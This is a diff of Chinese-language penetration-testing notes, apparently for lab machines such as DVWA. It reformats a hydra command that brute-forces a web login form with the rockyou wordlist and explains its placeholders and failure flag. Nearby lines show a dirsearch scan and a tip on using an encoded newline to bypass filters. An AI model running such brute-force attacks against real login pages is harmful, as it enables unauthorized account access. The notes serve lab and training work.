@@ -127,10 +127,15 @@ dirsearch -u http://ip -e* -x 404
 
 22. `%0a`是换行符url编码，绕过时有用
 
-23. hydra网页端爆破时，使用
-`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -s 7654 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"`
-username=^USER^&password=^PASS^&Login=Login：POST数据字符串。这里照抄浏览器中抓到的请求负载，但用 ^USER^ 和 ^PASS^ 这两个占位符替换掉实际的用户名和密码。Login=Login 是表单中可能存在的提交按钮参数，也需要保留。
-F=Login failed：失败/成功标志。F 表示查找失败时的特征字符串。如果登录失败，页面会包含“Login failed”，Hydra就会知道这次尝试没成功。也可以用 S=Success 来直接查找成功的特征
+23. hydra网页端爆破时
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -s 7654 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+username=^USER^&password=^PASS^&Login=Login：
+POST数据字符串。这里照抄浏览器中抓到的请求负载，但用 ^USER^ 和 ^PASS^ 这两个占位符替换掉实际的用户名和密码。
+Login=Login 是表单中可能存在的提交按钮参数，也需要保留。
+F=Login failed：失败/成功标志。F 表示查找失败时的特征字符串。如果登录失败，页面会包含“Login failed”，Hydra就会知道这次尝试没成功。
+也可以用 S=Success 来直接查找成功的特征
+```
 
 **110**（solidstate）：
 ```bash
